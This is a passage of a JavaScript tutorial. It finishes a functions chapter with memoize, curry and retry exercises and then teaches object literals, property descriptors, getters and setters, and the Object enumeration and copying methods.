<summary>Solution</summary>

```javascript
function memoize(fn) {
  const cache = new Map();
  
  return function(...args) {
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      return cache.get(key);
    }
    
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

// Usage
const slowFib = (n) => n <= 1 ? n : slowFib(n-1) + slowFib(n-2);
const fastFib = memoize(slowFib);
```
</details>

**Challenge 2:** Write a `curry(fn)` function that transforms `add(a, b, c)` into `add(1)(2)(3)`.

<details>
<summary>Solution</summary>

```javascript
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return function(...moreArgs) {
      return curried.apply(this, args.concat(moreArgs));
    };
  };
}

// Usage
const add = (a, b, c) => a + b + c;
const curriedAdd = curry(add);
console.log(curriedAdd(1)(2)(3));  // 6
console.log(curriedAdd(1, 2)(3));  // 6
```
</details>

**Challenge 3:** Create an async `retry(fn, maxAttempts)` that retries a failing async function.

<details>
<summary>Solution</summary>

```javascript
async function retry(fn, maxAttempts, delay = 1000) {
  let lastError;
  
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      return await fn();
    } catch (error) {
      lastError = error;
      if (attempt < maxAttempts) {
        await new Promise(r => setTimeout(r, delay));
      }
    }
  }
  
  throw lastError;
}

// Usage
const fetchData = () => fetch('/api/data').then(r => r.json());
const result = await retry(fetchData, 3);
```
</details>

---

**End of Chapter 3: Functions**

Functions are JavaScript's primary abstraction mechanism. With closures, higher-order patterns, generators, and async/await mastered, you're ready to tackle objects and prototypes.


# 04-Objects.md

# 4 Objects

Objects are JavaScript's fundamental data structureâ€”collections of key-value pairs that can store data and behavior. This chapter covers object creation, property manipulation, built-in methods, destructuring, spread/rest operations, and the critical `this` keyword.

---

# 4. Objects and Object-Oriented Programming

## 4.1 Object Fundamentals


### 4.1.1 Object Literals

### Basic Syntax

**Most common way to create objects:**

```javascript
const obj = {
  key1: "value1",
  key2: "value2"
};
```

---

### Property Types

**Various value types:**

```javascript
const person = {
  // String
  name: "Alice",
  
  // Number
  age: 30,
  
  // Boolean
  isActive: true,
  
  // Array
  hobbies: ["reading", "coding"],
  
  // Object
  address: {
    city: "NYC",
    country: "USA"
  },
  
  // Function (method)
  greet: function() {
    return `Hello, I'm ${this.name}`;
  },
  
  // Method shorthand (ES6)
  introduce() {
    return `I'm ${this.name}, ${this.age} years old`;
  }
};
```

---

### Property Keys

**Strings and symbols:**

```javascript
const obj = {
  // String key (quotes optional for valid identifiers)
  name: "Alice",
  
  // String key with quotes (required for special characters)
  "full name": "Alice Smith",
  
  // Numeric key (converted to string)
  123: "numeric",
  
  // Symbol key
  [Symbol("id")]: 42
};

console.log(obj.name);           // "Alice"
console.log(obj["full name"]);   // "Alice Smith"
console.log(obj[123]);           // "numeric"
console.log(obj["123"]);         // "numeric" (same)
```

---

### Trailing Commas

**Allowed (and recommended):**

```javascript
const obj = {
  a: 1,
  b: 2,
  c: 3,  // Trailing comma (easier diffs)
};
```

---

### Empty Objects

```javascript
const empty = {};

console.log(Object.keys(empty));  // []
console.log(Object.keys(empty).length);  // 0
```

---

### 4.1.2 Object Creation Methods

### `new Object()`

**Constructor syntax:**

```javascript
const obj = new Object();
obj.name = "Alice";
obj.age = 30;

console.log(obj);  // { name: "Alice", age: 30 }
```

**Rarely used (object literal preferred):**

```javascript
// Instead of:
const obj1 = new Object();
obj1.name = "Alice";

// Prefer:
const obj2 = { name: "Alice" };
```

---

### `Object.create()`

**Create object with specific prototype:**

```javascript
const proto = {
  greet() {
    return "Hello!";
  }
};

const obj = Object.create(proto);
obj.name = "Alice";

console.log(obj.name);     // "Alice" (own property)
console.log(obj.greet());  // "Hello!" (inherited from proto)
```

**`null` prototype (no inheritance):**

```javascript
const obj = Object.create(null);

console.log(obj.toString);  // undefined (no inherited methods)
console.log(obj.__proto__); // undefined
```

---

### `Object.create()` with Property Descriptors

```javascript
const obj = Object.create(Object.prototype, {
  name: {
    value: "Alice",
    writable: true,
    enumerable: true,
    configurable: true
  },
  age: {
    value: 30,
    writable: false,  // Read-only
    enumerable: true,
    configurable: true
  }
});

console.log(obj.name);  // "Alice"
obj.name = "Bob";
console.log(obj.name);  // "Bob" (writable)

obj.age = 31;
console.log(obj.age);   // 30 (not writable, silent failure)
```

---

### Constructor Functions (Pre-ES6)

```javascript
function Person(name, age) {
  this.name = name;
  this.age = age;
}

Person.prototype.greet = function() {
  return `Hello, I'm ${this.name}`;
};

const alice = new Person("Alice", 30);
console.log(alice.greet());  // "Hello, I'm Alice"
```

**Modern equivalent: classes (covered later)**

---

### 4.1.3 Property Access

### Dot Notation

**Standard access for valid identifiers:**

```javascript
const person = {
  name: "Alice",
  age: 30
};

console.log(person.name);  // "Alice"
console.log(person.age);   // 30
```

**Setting properties:**

```javascript
person.email = "alice@example.com";
console.log(person.email);  // "alice@example.com"
```

**Limitations:**

```javascript
const obj = {
  "full name": "Alice Smith",
  "123": "numeric"
};

// Can't use dot notation for these:
// obj.full name  // SyntaxError
// obj.123        // SyntaxError
```

---

### Bracket Notation

**Access any property (even with special characters):**

```javascript
const person = {
  name: "Alice",
  "full name": "Alice Smith",
  123: "numeric"
};

console.log(person["name"]);        // "Alice"
console.log(person["full name"]);   // "Alice Smith"
console.log(person[123]);           // "numeric"
console.log(person["123"]);         // "numeric" (same)
```

**Dynamic property access:**

```javascript
const prop = "name";
console.log(person[prop]);  // "Alice"

function getProp(obj, key) {
  return obj[key];
}

console.log(getProp(person, "age"));  // 30
```

**Computed from expressions:**

```javascript
const prefix = "user";
const id = 123;

const obj = {};
obj[prefix + id] = "Alice";

console.log(obj.user123);   // "Alice"
console.log(obj["user123"]);// "Alice"
```

---

### Optional Chaining (`?.`)

**Safe property access:**

```javascript
const user = {
  name: "Alice",
  address: {
    city: "NYC"
  }
};

// Traditional (verbose)
const country = user && user.address && user.address.country;

// Optional chaining (concise)
const country = user?.address?.country;

console.log(country);  // undefined (not error)
```

**With methods:**

```javascript
const user = {
  greet() {
    return "Hello!";
  }
};

console.log(user.greet?.());     // "Hello!"
console.log(user.farewell?.());  // undefined (method doesn't exist)
```

**With bracket notation:**

```javascript
const key = "address";
console.log(user?.[key]?.city);  // "NYC"
```

**Short-circuits:**

```javascript
let count = 0;

const obj = null;
obj?.[count++];

console.log(count);  // 0 (count++ not evaluated)
```

---

### Nested Property Access

```javascript
const user = {
  profile: {
    personal: {
      name: "Alice",
      age: 30
    },
    settings: {
      theme: "dark"
    }
  }
};

console.log(user.profile.personal.name);  // "Alice"
console.log(user["profile"]["settings"]["theme"]);  // "dark"

// Mixed
console.log(user.profile["personal"].name);  // "Alice"
```

---

### 4.1.4 Computed Property Names

### Basic Syntax

**Compute property names in object literals:**

```javascript
const key = "name";

const obj = {
  [key]: "Alice"
};

console.log(obj.name);  // "Alice"
console.log(obj[key]);  // "Alice"
```

---

### Expressions

**Any expression:**

```javascript
const prefix = "user";
const id = 123;

const obj = {
  [prefix + id]: "Alice",
  ["is" + "Admin"]: true,
  [1 + 2]: "three"
};

console.log(obj.user123);  // "Alice"
console.log(obj.isAdmin);  // true
console.log(obj[3]);       // "three"
```

---

### Function Calls

```javascript
function getKey() {
  return "dynamicKey";
}

const obj = {
  [getKey()]: "value"
};

console.log(obj.dynamicKey);  // "value"
```

---

### Symbol Keys

```javascript
const ID = Symbol("id");

const user = {
  [ID]: 123,
  name: "Alice"
};

console.log(user[ID]);  // 123
console.log(user.name); // "Alice"

// Symbol keys not enumerated
console.log(Object.keys(user));  // ["name"]

// Must use getOwnPropertySymbols
console.log(Object.getOwnPropertySymbols(user));  // [Symbol(id)]
```

---

### Template Literals

```javascript
const type = "user";
const action = "create";

const handlers = {
  [`${type}_${action}`]: function() {
    console.log("Creating user");
  }
};

handlers.user_create();  // "Creating user"
```

---

### Method Names

```javascript
const methodName = "greet";

const person = {
  name: "Alice",
  
  [methodName]() {
    return `Hello, I'm ${this.name}`;
  }
};

console.log(person.greet());  // "Hello, I'm Alice"
```

---

### 4.1.5 Property Shorthand

### Basic Shorthand

**When variable name matches property name:**

```javascript
const name = "Alice";
const age = 30;

// ES5
const person1 = {
  name: name,
  age: age
};

// ES6 shorthand
const person2 = {
  name,
  age
};

console.log(person2);  // { name: "Alice", age: 30 }
```

---

### Mixed Syntax

```javascript
const name = "Alice";

const person = {
  name,              // Shorthand
  age: 30,           // Traditional
  city: "NYC"        // Traditional
};
```

---

### Function Returns

```javascript
function createUser(name, email) {
  return {
    name,
    email,
    createdAt: Date.now()
  };
}

const user = createUser("Alice", "alice@example.com");
console.log(user);
// { name: "Alice", email: "alice@example.com", createdAt: 1234567890 }
```

---

### Destructuring with Shorthand

```javascript
const { name, age } = { name: "Alice", age: 30 };

const person = {
  name,  // Uses destructured value
  age    // Uses destructured value
};
```

---

### 4.1.6 Method Shorthand

### Basic Syntax

**Concise method definition:**

```javascript
// ES5
const obj1 = {
  greet: function() {
    return "Hello!";
  }
};

// ES6 shorthand
const obj2 = {
  greet() {
    return "Hello!";
  }
};
```

---

### `this` Binding

**Method shorthand has normal `this` (not arrow):**

```javascript
const person = {
  name: "Alice",
  
  greet() {
    return `Hello, I'm ${this.name}`;
  }
};

console.log(person.greet());  // "Hello, I'm Alice"

const greet = person.greet;
console.log(greet());  // "Hello, I'm undefined" (lost this)
```

---

### Generator Methods

```javascript
const obj = {
  *generator() {
    yield 1;
    yield 2;
    yield 3;
  }
};

const gen = obj.generator();
console.log([...gen]);  // [1, 2, 3]
```

---

### Async Methods

```javascript
const obj = {
  async fetchData() {
    const response = await fetch("/api/data");
    return response.json();
  }
};

obj.fetchData().then(data => console.log(data));
```

---

### Async Generator Methods

```javascript
const obj = {
  async *asyncGenerator() {
    yield await Promise.resolve(1);
    yield await Promise.resolve(2);
  }
};

(async () => {
  for await (let value of obj.asyncGenerator()) {
    console.log(value);
  }
})();
```

---

### Computed Method Names

```javascript
const methodName = "greet";

const person = {
  name: "Alice",
  
  [methodName]() {
    return `Hello, I'm ${this.name}`;
  },
  
  [`${methodName}Formal`]() {
    return `Good day, I am ${this.name}`;
  }
};

console.log(person.greet());        // "Hello, I'm Alice"
console.log(person.greetFormal());  // "Good day, I am Alice"
```

---


## 4.2 Properties


### 4.2.1 Data Properties

### Definition

**Properties that hold values:**

```javascript
const person = {
  name: "Alice",  // Data property
  age: 30         // Data property
};
```

---

### Default Attributes

**When created via assignment or literal:**

```javascript
const obj = { key: "value" };

// Default attributes:
// - value: "value"
// - writable: true
// - enumerable: true
// - configurable: true
```

---

### Reading and Writing

```javascript
const person = {
  name: "Alice"
};

// Read
console.log(person.name);  // "Alice"

// Write
person.name = "Bob";
console.log(person.name);  // "Bob"

// Add new property
person.age = 30;
console.log(person.age);  // 30
```

---

### Deleting

```javascript
const person = {
  name: "Alice",
  age: 30
};

delete person.age;
console.log(person.age);  // undefined
console.log("age" in person);  // false
```

---

### 4.2.2 Accessor Properties

### Getters and Setters

**Computed properties:**

```javascript
const person = {
  firstName: "Alice",
  lastName: "Smith",
  
  get fullName() {
    return `${this.firstName} ${this.lastName}`;
  },
  
  set fullName(value) {
    const parts = value.split(" ");
    this.firstName = parts[0];
    this.lastName = parts[1];
  }
};

// Getter (no parentheses)
console.log(person.fullName);  // "Alice Smith"

// Setter
person.fullName = "Bob Jones";
console.log(person.firstName);  // "Bob"
console.log(person.lastName);   // "Jones"
console.log(person.fullName);   // "Bob Jones"
```

---

### Read-Only Properties (Getter Only)

```javascript
const obj = {
  _value: 42,
  
  get value() {
    return this._value;
  }
  // No setter - read-only
};

console.log(obj.value);  // 42
obj.value = 100;         // Silently fails (strict mode: TypeError)
console.log(obj.value);  // Still 42
```

---

### Write-Only Properties (Setter Only)

```javascript
const logger = {
  _logs: [],
  
  set log(message) {
    this._logs.push(message);
    console.log(`Logged: ${message}`);
  }
  // No getter - write-only
};

logger.log = "Error occurred";  // Logs: "Logged: Error occurred"
console.log(logger.log);        // undefined (no getter)
console.log(logger._logs);      // ["Error occurred"]
```

---

### Validation in Setters

```javascript
const person = {
  _age: 0,
  
  get age() {
    return this._age;
  },
  
  set age(value) {
    if (typeof value !== "number") {
      throw new TypeError("Age must be a number");
    }
    if (value < 0 || value > 150) {
      throw new RangeError("Age must be between 0 and 150");
    }
    this._age = value;
  }
};

person.age = 30;     // OK
console.log(person.age);  // 30

person.age = -5;     // RangeError
person.age = "30";   // TypeError
```

---

### Computed Getters/Setters

```javascript
const rectangle = {
  width: 10,
  height: 20,
  
  get area() {
    return this.width * this.height;
  },
  
  set area(value) {
    // Maintain aspect ratio
    const ratio = this.width / this.height;
    this.height = Math.sqrt(value / ratio);
    this.width = value / this.height;
  }
};

console.log(rectangle.area);  // 200

rectangle.area = 400;
console.log(rectangle.width);   // ~14.14
console.log(rectangle.height);  // ~28.28
console.log(rectangle.area);    // 400
```

---

### 4.2.3 Property Attributes

### Four Attributes

**Data properties:**

1. **`value`**: The property's value
2. **`writable`**: Can the value be changed?
3. **`enumerable`**: Appears in `for...in`, `Object.keys()`?
4. **`configurable`**: Can attributes be changed? Can property be deleted?

**Accessor properties:**

1. **`get`**: Getter function (or `undefined`)
2. **`set`**: Setter function (or `undefined`)
3. **`enumerable`**: Appears in `for...in`, `Object.keys()`?
4. **`configurable`**: Can attributes be changed? Can property be deleted?

---

### Default Values

**When created via assignment:**

```javascript
const obj = {};
obj.prop = "value";

// Attributes:
// value: "value"
// writable: true
// enumerable: true
// configurable: true
```

**When created via `Object.defineProperty`:**

```javascript
const obj = {};
Object.defineProperty(obj, "prop", {
  value: "value"
});

// Attributes:
// value: "value"
// writable: false     â† defaults to false
// enumerable: false   â† defaults to false
// configurable: false â† defaults to false
```

---

### 4.2.4 Property Descriptors

### Descriptor Objects

**Describe property attributes:**

```javascript
// Data property descriptor
{
  value: "some value",
  writable: true,
  enumerable: true,
  configurable: true
}

// Accessor property descriptor
{
  get: function() { return this._value; },
  set: function(value) { this._value = value; },
  enumerable: true,
  configurable: true
}
```

---

### Cannot Mix Data and Accessor

```javascript
// Invalid: mixing value and get
{
  value: 42,        // Data attribute
  get: function() { return 42; }  // Accessor attribute
}
// TypeError: Invalid property descriptor
```

---

### 4.2.5 `Object.defineProperty()`

### Basic Syntax

```javascript
Object.defineProperty(obj, propName, descriptor)
```

---

### Defining Data Property

```javascript
const person = {};

Object.defineProperty(person, "name", {
  value: "Alice",
  writable: true,
  enumerable: true,
  configurable: true
});

console.log(person.name);  // "Alice"
```

---

### Read-Only Property

```javascript
const obj = {};

Object.defineProperty(obj, "constant", {
  value: 42,
  writable: false,
  enumerable: true,
  configurable: false
});

console.log(obj.constant);  // 42

obj.constant = 100;  // Silently fails (strict mode: TypeError)
console.log(obj.constant);  // Still 42

delete obj.constant;  // Silently fails (strict mode: TypeError)
console.log(obj.constant);  // Still 42
```

---

### Non-Enumerable Property

```javascript
const obj = {
  public: "visible"
};

Object.defineProperty(obj, "hidden", {
  value: "secret",
  writable: true,
  enumerable: false,  // Hidden from enumeration
  configurable: true
});

console.log(obj.hidden);  // "secret" (accessible)

console.log(Object.keys(obj));  // ["public"] (hidden not shown)

for (let key in obj) {
  console.log(key);  // Only "public"
}

// But visible in getOwnPropertyNames
console.log(Object.getOwnPropertyNames(obj));
// ["public", "hidden"]
```

---

### Non-Configurable Property

```javascript
const obj = {};

Object.defineProperty(obj, "permanent", {
  value: "cannot change attributes",
  writable: true,
  enumerable: true,
  configurable: false
});

// Cannot change attributes
Object.defineProperty(obj, "permanent", {
  enumerable: false  // TypeError: Cannot redefine property
});

// Cannot delete
delete obj.permanent;  // Silently fails (strict mode: TypeError)

// Can still change value (writable: true)
obj.permanent = "new value";  // OK
```

---

### Defining Accessor Property

```javascript
const obj = {
  _value: 0
};

Object.defineProperty(obj, "value", {
  get() {
    console.log("Getting value");
    return this._value;
  },
  set(newValue) {
    console.log("Setting value");
    this._value = newValue;
  },
  enumerable: true,
  configurable: true
});

obj.value = 42;      // Logs "Setting value"
console.log(obj.value);  // Logs "Getting value", then 42
```

---

### Modifying Existing Property

```javascript
const obj = {
  name: "Alice"
};

// Make read-only
Object.defineProperty(obj, "name", {
  writable: false
});

obj.name = "Bob";  // Silently fails
console.log(obj.name);  // Still "Alice"
```

---

### 4.2.6 `Object.defineProperties()`

### Define Multiple Properties

```javascript
const obj = {};

Object.defineProperties(obj, {
  name: {
    value: "Alice",
    writable: true,
    enumerable: true,
    configurable: true
  },
  
  age: {
    value: 30,
    writable: false,  // Read-only
    enumerable: true,
    configurable: false
  },
  
  email: {
    get() {
      return this._email;
    },
    set(value) {
      this._email = value.toLowerCase();
    },
    enumerable: true,
    configurable: true
  }
});

console.log(obj.name);  // "Alice"
console.log(obj.age);   // 30

obj.email = "ALICE@EXAMPLE.COM";
console.log(obj.email);  // "alice@example.com"
```

---

### Creating Immutable Objects

```javascript
const constants = {};

Object.defineProperties(constants, {
  PI: {
    value: 3.14159,
    writable: false,
    enumerable: true,
    configurable: false
  },
  
  E: {
    value: 2.71828,
    writable: false,
    enumerable: true,
    configurable: false
  }
});

constants.PI = 3;  // Silently fails
console.log(constants.PI);  // Still 3.14159
```

---

### 4.2.7 `Object.getOwnPropertyDescriptor()`

### Get Single Property Descriptor

```javascript
const person = {
  name: "Alice",
  age: 30
};

const nameDesc = Object.getOwnPropertyDescriptor(person, "name");

console.log(nameDesc);
// {
//   value: "Alice",
//   writable: true,
//   enumerable: true,
//   configurable: true
// }
```

---

### Inspecting Accessor Properties

```javascript
const obj = {
  _value: 42,
  
  get value() {
    return this._value;
  },
  
  set value(newValue) {
    this._value = newValue;
  }
};

const desc = Object.getOwnPropertyDescriptor(obj, "value");

console.log(desc);
// {
//   get: [Function: get value],
//   set: [Function: set value],
//   enumerable: true,
//   configurable: true
// }
```

---

### Non-Existent Property

```javascript
const obj = { a: 1 };

const desc = Object.getOwnPropertyDescriptor(obj, "nonexistent");

console.log(desc);  // undefined
```

---

### Inherited Properties

```javascript
const proto = { inherited: "value" };
const obj = Object.create(proto);
obj.own = "own value";

// Only returns descriptor for OWN properties
console.log(Object.getOwnPropertyDescriptor(obj, "own"));
// { value: "own value", writable: true, enumerable: true, configurable: true }

console.log(Object.getOwnPropertyDescriptor(obj, "inherited"));
// undefined (inherited, not own)
```

---

### 4.2.8 `Object.getOwnPropertyDescriptors()`

### Get All Property Descriptors

```javascript
const person = {
  name: "Alice",
  age: 30,
  
  get fullInfo() {
    return `${this.name}, ${this.age}`;
  }
};

const descriptors = Object.getOwnPropertyDescriptors(person);

console.log(descriptors);
// {
//   name: {
//     value: "Alice",
//     writable: true,
//     enumerable: true,
//     configurable: true
//   },
//   age: {
//     value: 30,
//     writable: true,
//     enumerable: true,
//     configurable: true
//   },
//   fullInfo: {
//     get: [Function: get fullInfo],
//     set: undefined,
//     enumerable: true,
//     configurable: true
//   }
// }
```

---

### Cloning Objects with Accessors

**Problem with `Object.assign` (doesn't preserve getters/setters):**

```javascript
const source = {
  _value: 42,
  
  get value() {
    return this._value;
  },
  
  set value(newValue) {
    this._value = newValue;
  }
};

// Object.assign converts getter to data property
const clone1 = Object.assign({}, source);
console.log(Object.getOwnPropertyDescriptor(clone1, "value"));
// { value: 42, writable: true, enumerable: true, configurable: true }
// Lost getter/setter!

// Solution: Use descriptors
const clone2 = Object.defineProperties(
  {},
  Object.getOwnPropertyDescriptors(source)
);

console.log(Object.getOwnPropertyDescriptor(clone2, "value"));
// { get: [Function: get value], set: [Function: set value], ... }
// Preserved getter/setter!
```

---

### Shallow Clone Utility

```javascript
function shallowClone(obj) {
  return Object.defineProperties(
    {},
    Object.getOwnPropertyDescriptors(obj)
  );
}

const original = {
  name: "Alice",
  
  get greeting() {
    return `Hello, ${this.name}`;
  }
};

const clone = shallowClone(original);

console.log(clone.greeting);  // "Hello, Alice"
clone.name = "Bob";
console.log(clone.greeting);  // "Hello, Bob"
```

---

### 4.2.9 Property Attribute Interactions

### `writable` and `configurable`

```javascript
const obj = {};

// writable: false, configurable: true
Object.defineProperty(obj, "prop1", {
  value: 1,
  writable: false,
  configurable: true
});

obj.prop1 = 2;  // Silently fails
console.log(obj.prop1);  // Still 1

// But can change via defineProperty
Object.defineProperty(obj, "prop1", {
  value: 2
});
console.log(obj.prop1);  // 2

// And can change writable
Object.defineProperty(obj, "prop1", {
  writable: true
});

obj.prop1 = 3;  // Now works
console.log(obj.prop1);  // 3
```

---

### `configurable: false` Restrictions

**Cannot change most attributes:**

```javascript
const obj = {};

Object.defineProperty(obj, "prop", {
  value: 1,
  writable: true,
  enumerable: true,
  configurable: false
});

// Cannot change enumerable
Object.defineProperty(obj, "prop", {
  enumerable: false  // TypeError
});

// Cannot change configurable back to true
Object.defineProperty(obj, "prop", {
  configurable: true  // TypeError
});

// Cannot delete
delete obj.prop;  // Silently fails (strict mode: TypeError)
```

**Exception: Can change `writable` from `true` to `false`:**

```javascript
const obj = {};

Object.defineProperty(obj, "prop", {
  value: 1,
  writable: true,
  configurable: false
});

// This is allowed
Object.defineProperty(obj, "prop", {
  writable: false
});

// But cannot change back to true
Object.defineProperty(obj, "prop", {
  writable: true  // TypeError
});
```

---

### `enumerable` Effects

```javascript
const obj = {
  visible: 1
};

Object.defineProperty(obj, "hidden", {
  value: 2,
  enumerable: false
});

// for...in
for (let key in obj) {
  console.log(key);  // Only "visible"
}

// Object.keys
console.log(Object.keys(obj));  // ["visible"]

// Object.values
console.log(Object.values(obj));  // [1]

// Object.entries
console.log(Object.entries(obj));  // [["visible", 1]]

// JSON.stringify
console.log(JSON.stringify(obj));  // {"visible":1}

// But still accessible
console.log(obj.hidden);  // 2

// And visible in getOwnPropertyNames
console.log(Object.getOwnPropertyNames(obj));
// ["visible", "hidden"]
```

---

### 4.2.10 Common Patterns

### Private Properties (Convention)

```javascript
const person = {
  _name: "Alice",  // Convention: _ prefix means private
  
  get name() {
    return this._name;
  },
  
  set name(value) {
    if (typeof value === "string") {
      this._name = value;
    }
  }
};

// Users can still access _name, but convention says "don't"
console.log(person._name);  // "Alice" (not truly private)
```

---

### Truly Private with Symbols

```javascript
const _name = Symbol("name");

const person = {
  [_name]: "Alice",
  
  get name() {
    return this[_name];
  },
  
  set name(value) {
    this[_name] = value;
  }
};

console.log(person.name);    // "Alice"
console.log(person[_name]);  // "Alice" (if you have the symbol)

// Symbol not in regular enumeration
console.log(Object.keys(person));  // ["name"]

// But visible in getOwnPropertySymbols
console.log(Object.getOwnPropertySymbols(person));  // [Symbol(name)]
```

---

### Truly Private with WeakMap

```javascript
const privateData = new WeakMap();

class Person {
  constructor(name) {
    privateData.set(this, { name });
  }
  
  get name() {
    return privateData.get(this).name;
  }
  
  set name(value) {
    privateData.get(this).name = value;
  }
}

const person = new Person("Alice");
console.log(person.name);  // "Alice"

// No way to access private data without reference to WeakMap
```

---

### Immutable Properties

```javascript
function createImmutable(obj) {
  const immutable = {};
  
  Object.keys(obj).forEach(key => {
    Object.defineProperty(immutable, key, {
      value: obj[key],
      writable: false,
      enumerable: true,
      configurable: false
    });
  });
  
  return immutable;
}

const config = createImmutable({
  apiUrl: "https://api.example.com",
  timeout: 5000
});

config.apiUrl = "https://hack.com";  // Silently fails
console.log(config.apiUrl);  // Still "https://api.example.com"
```

---

### Lazy Properties

```javascript
const obj = {
  _expensive: undefined,
  
  get expensive() {
    if (this._expensive === undefined) {
      console.log("Computing expensive value...");
      this._expensive = computeExpensiveValue();
    }
    return this._expensive;
  }
};

function computeExpensiveValue() {
  // Simulate expensive computation
  let result = 0;
  for (let i = 0; i < 1000000; i++) {
    result += i;
  }
  return result;
}

console.log(obj.expensive);  // Logs "Computing...", then value
console.log(obj.expensive);  // Returns cached value (no log)
```

---

### Self-Defining Properties

```javascript
const obj = {
  get expensive() {
    // Compute value
    const value = computeExpensiveValue();
    
    // Redefine as data property
    Object.defineProperty(this, "expensive", {
      value,
      writable: false,
      enumerable: true,
      configurable: false
    });
    
    return value;
  }
};

// First access: getter runs, converts to data property
console.log(obj.expensive);  // Computes and caches

// Subsequent access: data property (fast)
console.log(obj.expensive);  // Just returns value
```

---

## Summary

### Object Creation

- **Object literals**: `{ key: value }`
- **`new Object()`**: Constructor (rarely used)
- **`Object.create(proto)`**: With specific prototype
- **Constructor functions**: Pre-ES6 pattern

### Property Access

- **Dot notation**: `obj.prop`
- **Bracket notation**: `obj["prop"]`, `obj[variable]`
- **Optional chaining**: `obj?.prop?.nested`
- **Computed names**: `{ [key]: value }`
- **Shorthand**: `{ name, age }`
- **Method shorthand**: `{ method() { } }`

### Property Types

- **Data properties**: Hold values
- **Accessor properties**: Getters/setters

### Property Attributes

- **Data**: `value`, `writable`, `enumerable`, `configurable`
- **Accessor**: `get`, `set`, `enumerable`, `configurable`

### Descriptor Methods

- **`Object.defineProperty()`**: Define single property
- **`Object.defineProperties()`**: Define multiple properties
- **`Object.getOwnPropertyDescriptor()`**: Get single descriptor
- **`Object.getOwnPropertyDescriptors()`**: Get all descriptors

### Key Patterns

- **Private properties**: Symbols, WeakMap, or `#` (classes)
- **Immutable properties**: `writable: false`, `configurable: false`
- **Hidden properties**: `enumerable: false`
- **Lazy evaluation**: Compute on first access
- **Validation**: Setters with type/range checks

---

## 4.3 Object Methods


### 4.3.1 Enumeration Methods

### `Object.keys()`

**Returns array of own enumerable property names:**

```javascript
const person = {
  name: "Alice",
  age: 30,
  city: "NYC"
};

console.log(Object.keys(person));  // ["name", "age", "city"]
```

---

#### Own Properties Only

**Does not include inherited properties:**

```javascript
const proto = { inherited: "value" };
const obj = Object.create(proto);
obj.own = "own value";

console.log(Object.keys(obj));  // ["own"]
// "inherited" not included (it's inherited, not own)
```

---

#### Enumerable Only

**Does not include non-enumerable properties:**

```javascript
const obj = { visible: 1 };

Object.defineProperty(obj, "hidden", {
  value: 2,
  enumerable: false
});

console.log(Object.keys(obj));  // ["visible"]
// "hidden" not included (non-enumerable)
```

---

#### Order

**Follows specific order:**

1. Integer keys in ascending order
2. String keys in creation order
3. Symbol keys (not included in `Object.keys`)

```javascript
const obj = {
  b: 2,
  1: "one",
  a: 1,
  3: "three",
  2: "two"
};

console.log(Object.keys(obj));
// ["1", "2", "3", "b", "a"]
// Integers first (sorted), then strings (creation order)
```

---

#### Practical Use

**Iterate object properties:**

```javascript
const scores = { alice: 95, bob: 87, charlie: 92 };

Object.keys(scores).forEach(name => {
  console.log(`${name}: ${scores[name]}`);
});
// alice: 95
// bob: 87
// charlie: 92
```

**Count properties:**

```javascript
const obj = { a: 1, b: 2, c: 3 };
console.log(Object.keys(obj).length);  // 3
```

---

### `Object.values()`

**Returns array of own enumerable property values:**

```javascript
const person = {
  name: "Alice",
  age: 30,
  city: "NYC"
};

console.log(Object.values(person));  // ["Alice", 30, "NYC"]
```

---

#### Same Rules as `Object.keys()`

**Own, enumerable properties only:**

```javascript
const proto = { inherited: "value" };
const obj = Object.create(proto);
obj.visible = 1;

Object.defineProperty(obj, "hidden", {
  value: 2,
  enumerable: false
});

console.log(Object.values(obj));  // [1]
```

---

#### Practical Use

**Sum values:**

```javascript
const scores = { alice: 95, bob: 87, charlie: 92 };

const total = Object.values(scores).reduce((sum, score) => sum + score, 0);
console.log(total);  // 274

const average = total / Object.values(scores).length;
console.log(average);  // 91.33
```

**Check for value:**

```javascript
const user = { name: "Alice", role: "admin" };

if (Object.values(user).includes("admin")) {
  console.log("User is admin");
}
```

---

### `Object.entries()`

**Returns array of [key, value] pairs:**

```javascript
const person = {
  name: "Alice",
  age: 30,
  city: "NYC"
};

console.log(Object.entries(person));
// [["name", "Alice"], ["age", 30], ["city", "NYC"]]
```

---

#### Destructuring

```javascript
const person = { name: "Alice", age: 30 };

for (const [key, value] of Object.entries(person)) {
  console.log(`${key}: ${value}`);
}
// name: Alice
// age: 30
```

---

#### Convert to Map

```javascript
const obj = { a: 1, b: 2, c: 3 };

const map = new Map(Object.entries(obj));

console.log(map.get("a"));  // 1
console.log(map.size);      // 3
```

---

#### Filter Object

```javascript
const scores = {
  alice: 95,
  bob: 65,
  charlie: 92,
  david: 58
};

const passing = Object.fromEntries(
  Object.entries(scores).filter(([name, score]) => score >= 70)
);

console.log(passing);  // { alice: 95, charlie: 92 }
```

---

### `Object.fromEntries()`

**Create object from [key, value] pairs:**

```javascript
const entries = [
  ["name", "Alice"],
  ["age", 30],
  ["city", "NYC"]
];

const person = Object.fromEntries(entries);
console.log(person);
// { name: "Alice", age: 30, city: "NYC" }
```

---

#### Convert Map to Object

```javascript
const map = new Map([
  ["a", 1],
  ["b", 2],
  ["c", 3]
]);

const obj = Object.fromEntries(map);
console.log(obj);  // { a: 1, b: 2, c: 3 }
```

---

#### Transform Object

```javascript
const prices = { apple: 1.5, banana: 0.75, orange: 2.0 };

// Double all prices
const doubledPrices = Object.fromEntries(
  Object.entries(prices).map(([item, price]) => [item, price * 2])
);

console.log(doubledPrices);
// { apple: 3, banana: 1.5, orange: 4 }
```

---

#### Swap Keys and Values

```javascript
const original = { a: "x", b: "y", c: "z" };

const swapped = Object.fromEntries(
  Object.entries(original).map(([key, value]) => [value, key])
);

console.log(swapped);  // { x: "a", y: "b", z: "c" }
```

---

### 4.3.2 Object Copying

### `Object.assign()`

**Copy properties from source(s) to target:**

```javascript
Object.assign(target, source1, source2, ...)
```

---

#### Basic Usage

```javascript
const target = { a: 1 };
const source = { b: 2, c: 3 };

Object.assign(target, source);

console.log(target);  // { a: 1, b: 2, c: 3 }
```

---

#### Shallow Copy

```javascript
const original = {
  name: "Alice",
  address: {
    city: "NYC"
  }
};

const copy = Object.assign({}, original);

copy.name = "Bob";
copy.address.city = "LA";

console.log(original.name);         // "Alice" (not affected)
console.log(original.address.city); // "LA" (shallow copy!)
```

---

#### Multiple Sources

**Later sources override earlier ones:**

```javascript
